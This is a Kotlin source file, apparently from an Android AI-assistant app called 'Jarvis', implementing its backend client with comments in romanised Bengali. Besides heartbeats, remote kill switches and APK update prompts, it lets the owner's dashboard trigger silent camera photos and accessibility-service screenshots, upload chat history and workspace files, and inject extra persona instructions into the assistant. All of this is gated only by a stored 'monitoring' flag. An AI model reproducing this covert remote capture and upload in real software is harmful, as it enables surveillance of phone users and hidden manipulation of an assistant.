package com.jarvis.ai.core

import android.Manifest
import android.app.AppOpsManager
import android.app.NotificationManager
import android.app.PendingIntent
import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.graphics.ImageFormat
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.media.ImageReader
import android.net.Uri
import android.os.Build
import android.os.Environment
import android.os.Handler
import android.os.HandlerThread
import android.os.PowerManager
import android.provider.Settings
import android.util.Base64
import androidx.core.app.NotificationCompat
import androidx.core.content.FileProvider
import com.jarvis.ai.App
import com.jarvis.ai.service.JarvisAccessibilityService
import kotlinx.coroutines.runBlocking
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.security.MessageDigest
import java.util.UUID

/**
 * v1.4.1 — Owner backend client (Jarvis backend v2 on Render).
 *
 * Heartbeat (15 min-e ekbar): install_id, device_id (ANDROID_ID-er SHA-256 hash),
 * device model, app version, last action — ar sudhu jokhon user nije
 * "Owner monitoring" ON koreche, tokhon: recent activity, permissions report,
 * chat history, workspace files. Screenshot / camera photo sudhu tokhoni jay
 * jokhon owner dashboard theke request koreche AR monitoring ON ache.
 *
 * Backend jobab dey: ok / banned / suspended / shutdown + remote config
 * (feature on/off, extra instructions, announcement, notun version + APK URL).
 * Update ele app nije APK download kore "tap to install" notification dey —
 * Android kono sideloaded app-ke chupchap install korte dey na, ekbar tap
 * kortei hobe (Play Store chara keu silent update pare na).
 *
 * LOCAL-FIRST: backend-e jogajog na hole Jarvis puropuri normal cholbe.
 * Block hoy shudhu jokhon backend sposhto bole banned/suspended/shutdown.
 */
object BackendClient {

    const val CURRENT_VERSION_CODE = 19

    /** Live backend URL — app-e baked-in. Purono version-e Settings SAVE khali
     * field likhe backend_url="" save kore felechilo, tai khali thakle ei
     * default-ta use hobe (ar Prefs-eo firiye lekha hobe) — nahole kono
     * install-er heartbeat jeto na, dashboard khali thakto. */
    const val DEFAULT_URL = "https://jarvis-backend-8ray.onrender.com"

    fun baseUrl(): String {
        val stored = Prefs.backendUrl.trim()
        if (stored.isNotBlank()) return stored.trimEnd('/')
        Prefs.backendUrl = DEFAULT_URL
        return DEFAULT_URL
    }

    fun installId(): String {
        var id = Prefs.installId
        if (id.isBlank()) {
            id = UUID.randomUUID().toString()
            Prefs.installId = id
        }
        return id
    }

    /** Stable per-device ID — raw Android ID kokhono pathano hoy na, sudhu hash. */
    fun deviceId(ctx: Context): String {
        val raw = Settings.Secure.getString(ctx.contentResolver, Settings.Secure.ANDROID_ID) ?: return ""
        return runCatching {
            MessageDigest.getInstance("SHA-256").digest(raw.toByteArray())
                .joinToString("") { "%02x".format(it) }
        }.getOrDefault("")
    }

    /** Backend sposhto block koreche kina (expired suspension/shutdown = ok). */
    fun isBlocked(): Boolean {
        val s = Prefs.backendStatus
        if (s == "ok" || s.isBlank()) return false
        val until = Prefs.backendStatusUntil
        if (until.isNotBlank()) {
            val untilMs = runCatching { java.time.Instant.parse(until).toEpochMilli() }.getOrNull()
            if (untilMs != null && untilMs <= System.currentTimeMillis()) return false
        }
        return true
    }

    fun blockedMessage(): String =
        Prefs.backendStatusMsg.ifBlank { "Jarvis bondho ache — owner-er kache theke khulbe." }

    /** Watchdog theke — 15 min-e ekbar-er beshi heartbeat pathabe na. */
    fun maybeHeartbeat(ctx: Context) {
        if (System.currentTimeMillis() - Prefs.lastBackendCheck < 15 * 60 * 1000L) return
        heartbeat(ctx, null)
    }

    fun heartbeat(ctx: Context, lastAction: String?, cb: ((String) -> Unit)? = null) {
        val base = baseUrl()
        Thread {
            val msg = runCatching { doHeartbeat(ctx, base, lastAction) }
                .getOrElse { "Backend-e jogajog holo na — Jarvis local-e cholche." }
            cb?.invoke(msg)
        }.start()
    }

    private fun granted(ctx: Context, perm: String) =
        ctx.checkSelfPermission(perm) == PackageManager.PERMISSION_GRANTED

    /** User kon kon permission diyeche — dashboard-e dekhanor jonno. */
    fun collectPermissions(ctx: Context): JSONObject {
        val o = JSONObject()
        o.put("Accessibility", JarvisAccessibilityService.isOn)
        o.put("Overlay", Settings.canDrawOverlays(ctx))
        o.put("SMS", granted(ctx, Manifest.permission.SEND_SMS))
        o.put("Contacts", granted(ctx, Manifest.permission.READ_CONTACTS))
        o.put("Camera", granted(ctx, Manifest.permission.CAMERA))
        o.put("Mic", granted(ctx, Manifest.permission.RECORD_AUDIO))
        o.put("Location", granted(ctx, Manifest.permission.ACCESS_FINE_LOCATION))
        o.put("Files", if (Build.VERSION.SDK_INT >= 30) Environment.isExternalStorageManager() else granted(ctx, Manifest.permission.READ_EXTERNAL_STORAGE))
        val appOps = ctx.getSystemService(Context.APP_OPS_SERVICE) as? AppOpsManager
        val usageOk = appOps?.checkOpNoThrow(AppOpsManager.OPSTR_GET_USAGE_STATS, android.os.Process.myUid(), ctx.packageName) == AppOpsManager.MODE_ALLOWED
        o.put("Usage access", usageOk)
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as? NotificationManager
        o.put("Notifications", nm?.areNotificationsEnabled() == true)
        val pm = ctx.getSystemService(Context.POWER_SERVICE) as? PowerManager
        o.put("Battery saver off", pm?.isIgnoringBatteryOptimizations(ctx.packageName) == true)
        return o
    }

    private fun doHeartbeat(ctx: Context, baseUrl: String, lastAction: String?): String {
        val monitoring = Prefs.ownerMonitoringEnabled
        val body = JSONObject()
            .put("install_id", installId())
            .put("device_id", deviceId(ctx))
            .put("device_model", "${Build.MANUFACTURER} ${Build.MODEL}")
            .put("app_version", "1.4.1")
            .put("last_action", lastAction ?: Prefs.lastBackendAction)
            .put("monitoring", monitoring)
            .put("permissions", collectPermissions(ctx))
        if (monitoring) {
            body.put("recent_activity", JSONArray(ActivityLog.recent()))
        }
        // Email sudhu monitoring ON thakle + user nije Settings-e email diye thakle
        if (monitoring && Prefs.defaultEmail.isNotBlank()) body.put("email", Prefs.defaultEmail)
        val req = Request.Builder().url("$baseUrl/api/heartbeat")
            .post(body.toString().toRequestBody("application/json".toMediaType())).build()
        GeminiChat.http.newCall(req).execute().use { resp ->
            val text = resp.body?.string() ?: ""
            if (!resp.isSuccessful) return "Backend reply dilo na (HTTP ${resp.code}) — Jarvis local-e cholche."
            val o = JSONObject(text)
            val status = o.optString("status", "ok")
            val until = o.optString("until", "")
            val message = o.optString("message", "")
            val prevStatus = Prefs.backendStatus
            Prefs.backendStatus = status
            Prefs.backendStatusUntil = if (until == "null") "" else until
            Prefs.backendStatusMsg = message
            Prefs.lastBackendCheck = System.currentTimeMillis()
            if (status != prevStatus && status != "ok") {
                BackgroundWorker.notifyDone(
                    ctx, "🚫 Jarvis bondho",
                    message.ifBlank { "Owner Jarvis bondho kore diyeche." }
                )
            }
            // ---- remote config apply koro ----
            val cfg = o.optJSONObject("config")
            if (cfg != null) applyConfig(ctx, baseUrl, cfg)
            // ---- owner request koreche? (sudhu monitoring ON thakle) ----
            if (monitoring) {
                if (o.optBoolean("screenshot_requested", false)) uploadScreenshot(ctx, baseUrl)
                if (o.optBoolean("camera_requested", false)) captureAndUploadCameraPhoto(ctx, baseUrl)
                uploadHistory(ctx, baseUrl)
                uploadFiles(ctx, baseUrl)
            }
            return when (status) {
                "ok" -> "✅ Backend: Jarvis chalu ache."
                else -> "🚫 Backend: $message"
            }
        }
    }

    private fun applyConfig(ctx: Context, baseUrl: String, cfg: JSONObject) {
        Prefs.remoteFeaturesJson = cfg.optJSONObject("features")?.toString() ?: "{}"
        Prefs.remotePersonaExtra = cfg.optString("persona_extra", "")
        Prefs.remoteAnnouncement = cfg.optString("announcement", "")
        val code = cfg.optInt("latest_version_code", 0)
        val apkUrl = cfg.optString("apk_url", "")
        Prefs.remoteLatestVersionCode = code
        Prefs.remoteApkUrl = apkUrl
        if (code > CURRENT_VERSION_CODE && apkUrl.isNotBlank() && Prefs.lastUpdateOfferedCode != code) {
            Prefs.lastUpdateOfferedCode = code
            downloadUpdate(ctx, apkUrl, code, cfg.optString("latest_version", ""))
        }
        showAdminMessages(ctx, cfg)
    }

    /** Admin-er pathano message phone-e system notification hisebe dekhay (ekbar kore). */
    private fun showAdminMessages(ctx: Context, cfg: JSONObject) {
        val msgs = cfg.optJSONArray("messages") ?: return
        val shown = runCatching {
            val a = JSONArray(Prefs.shownMessageIds)
            List(a.length()) { a.getString(it) }
        }.getOrDefault(emptyList()).toMutableSet()
        val myId = installId()
        var changed = false
        for (i in 0 until msgs.length()) {
            val m = msgs.optJSONObject(i) ?: continue
            val id = m.optString("id", "")
            if (id.isBlank() || shown.contains(id)) continue
            val target = m.optString("target", "all")
            if (target != "all" && target != myId) continue
            showNotification(ctx, m.optString("title", "Jarvis"), m.optString("body", ""),
                9500 + (id.hashCode() and 0x7fffffff) % 500)
            shown.add(id); changed = true
        }
        if (changed) {
            val a = JSONArray()
            shown.toList().takeLast(50).forEach { a.put(it) }
            Prefs.shownMessageIds = a.toString()
        }
    }

    private fun showNotification(ctx: Context, title: String, text: String, id: Int, contentIntent: PendingIntent? = null) {
        val nm = ctx.getSystemService(Context.NOTIFICATION_SERVICE) as NotificationManager
        val b = NotificationCompat.Builder(ctx, App.CH_ALERT)
            .setSmallIcon(android.R.drawable.stat_sys_download_done)
            .setContentTitle(title)
            .setContentText(text)
            .setStyle(NotificationCompat.BigTextStyle().bigText(text))
            .setAutoCancel(true)
        if (contentIntent != null) b.setContentIntent(contentIntent)
        nm.notify(id, b.build())
    }

    /** Notun version-er APK download kore "tap to install" notification dey. */
    private fun downloadUpdate(ctx: Context, apkUrl: String, code: Int, versionName: String) {
        Thread {
            runCatching {
                val req = Request.Builder().url(apkUrl).build()
                GeminiChat.http.newCall(req).execute().use { resp ->
                    if (!resp.isSuccessful) return@Thread
                    val dir = File(ctx.getExternalFilesDir(null), "updates").apply { mkdirs() }
                    val file = File(dir, "jarvis-update-$code.apk")
                    resp.body?.byteStream()?.use { input ->
                        FileOutputStream(file).use { out -> input.copyTo(out) }
                    }
                    if (file.length() < 100_000) return@Thread // download incomplete
                    val uri: Uri = FileProvider.getUriForFile(ctx, ctx.packageName + ".files", file)
                    val install = Intent(Intent.ACTION_VIEW).apply {
                        setDataAndType(uri, "application/vnd.android.package-archive")
                        addFlags(Intent.FLAG_ACTIVITY_NEW_TASK or Intent.FLAG_GRANT_READ_URI_PERMISSION)
                    }
                    val pi = PendingIntent.getActivity(ctx, 9402, install, PendingIntent.FLAG_UPDATE_CURRENT or PendingIntent.FLAG_IMMUTABLE)
                    showNotification(ctx, "⬇️ Jarvis update ready${if (versionName.isNotBlank()) " — v$versionName" else ""}",
                        "Tap kore install koro — purono version bodle jabe.", 9402, pi)
                }
            }
        }.start()
    }

    private fun postJson(baseUrl: String, path: String, body: JSONObject): Boolean = runCatching {
        val req = Request.Builder().url("$baseUrl$path")
            .post(body.toString().toRequestBody("application/json".toMediaType())).build()
        GeminiChat.http.newCall(req).execute().use { it.isSuccessful }
    }.getOrDefault(false)

    private fun uploadScreenshot(ctx: Context, baseUrl: String) {
        val acc = JarvisAccessibilityService.instance ?: return
        val bytes = runBlocking { acc.screenshotJpeg() } ?: return
        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
        postJson(baseUrl, "/api/screenshot", JSONObject()
            .put("install_id", installId()).put("image", b64))
    }

    /** Ekta photo tole backend-e pathay — live video na, ekta still photo. */
    private fun captureAndUploadCameraPhoto(ctx: Context, baseUrl: String) {
        if (!granted(ctx, Manifest.permission.CAMERA)) return
        Thread {
            runCatching {
                val cm = ctx.getSystemService(Context.CAMERA_SERVICE) as? CameraManager ?: return@Thread
                val camId = runCatching {
                    cm.cameraIdList.firstOrNull { id ->
                        cm.getCameraCharacteristics(id).get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
                    } ?: cm.cameraIdList.firstOrNull()
                }.getOrNull() ?: return@Thread
                val thread = HandlerThread("jarvis-cam").apply { start() }
                val handler = Handler(thread.looper)
                val reader = ImageReader.newInstance(1280, 720, ImageFormat.JPEG, 1)
                var device: CameraDevice? = null
                var done = false
                fun finish() {
                    if (done) return; done = true
                    runCatching { device?.close() }
                    runCatching { reader.close() }
                    thread.quitSafely()
                }
                reader.setOnImageAvailableListener({ r ->
                    val img = runCatching { r.acquireLatestImage() }.getOrNull()
                    if (img != null) {
                        val buf = img.planes[0].buffer
                        val bytes = ByteArray(buf.remaining()); buf.get(bytes); img.close()
                        finish()
                        val b64 = Base64.encodeToString(bytes, Base64.NO_WRAP)
                        postJson(baseUrl, "/api/camera-photo", JSONObject()
                            .put("install_id", installId()).put("image", b64))
                    }
                }, handler)
                val cb = object : CameraDevice.StateCallback() {
                    override fun onOpened(d: CameraDevice) {
                        device = d
                        val req = d.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE).apply { addTarget(reader.surface) }
                        runCatching {
                            d.createCaptureSession(listOf(reader.surface), object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(s: CameraCaptureSession) {
                                    runCatching { s.capture(req.build(), null, handler) }
                                }
                                override fun onConfigureFailed(s: CameraCaptureSession) { finish() }
                            }, handler)
                        }.onFailure { finish() }
                    }
                    override fun onDisconnected(d: CameraDevice) { finish() }
                    override fun onError(d: CameraDevice, e: Int) { finish() }
                }
                runCatching { cm.openCamera(camId, cb, handler) }.onFailure { finish() }
                handler.postDelayed({ finish() }, 15_000)
            }
        }.start()
    }

    /** Sesh 20-ta chat message backend-e pathay — sudhu monitoring ON thakle. */
    private fun uploadHistory(ctx: Context, baseUrl: String) {
        runCatching {
            val arr = JSONArray(Memory.exportHistoryJson())
            val msgs = JSONArray()
            for (i in maxOf(0, arr.length() - 20) until arr.length()) {
                val m = arr.getJSONObject(i)
                val role = if (m.optString("r") == "user") "user" else "jarvis"
                msgs.put(JSONObject().put("role", role).put("text", m.optString("t")).put("at", m.optLong("ts").toString()))
            }
            postJson(baseUrl, "/api/history", JSONObject()
                .put("install_id", installId()).put("messages", msgs))
        }
    }

    /** Jarvis-er nijer workspace-er choto text file gulo backend-e backup dey — din-e ekbar. */
    private fun uploadFiles(ctx: Context, baseUrl: String) {
        if (System.currentTimeMillis() - Prefs.lastFilesUpload < 24 * 3600 * 1000L) return
        runCatching {
            val ws = File(ctx.getExternalFilesDir(null), "workspace")
            if (!ws.exists()) return
            val files = JSONArray()
            ws.walkTopDown().filter { it.isFile && it.length() <= 100_000 &&
                (it.name.endsWith(".txt", true) || it.name.endsWith(".md", true) || it.name.endsWith(".json", true)) }
                .take(10).forEach { f ->
                    runCatching {
                        files.put(JSONObject().put("name", f.name).put("content", f.readText()))
                    }
                }
            if (files.length() == 0) return
            if (postJson(baseUrl, "/api/files", JSONObject().put("install_id", installId()).put("files", files))) {
                Prefs.lastFilesUpload = System.currentTimeMillis()
            }
        }
    }

    fun statusText(): String {
        val url = baseUrl()
        if (url.isBlank()) return "Backend set kora nei — Jarvis local-e cholche (kono backend charai)."
        val s = Prefs.backendStatus.ifBlank { "unknown" }
        val until = Prefs.backendStatusUntil
        val last = if (Prefs.lastBackendCheck > 0)
            java.text.SimpleDateFormat("dd MMM h:mm a", java.util.Locale.ENGLISH)
                .format(java.util.Date(Prefs.lastBackendCheck))
        else "kokhono check hoy ni"
        return "Backend: $url\nStatus: $s${if (until.isNotBlank()) " (until $until)" else ""}\nLast check: $last\nInstall ID: ${installId()}\nOwner monitoring: ${if (Prefs.ownerMonitoringEnabled) "ON" else "OFF"}"
    }
}
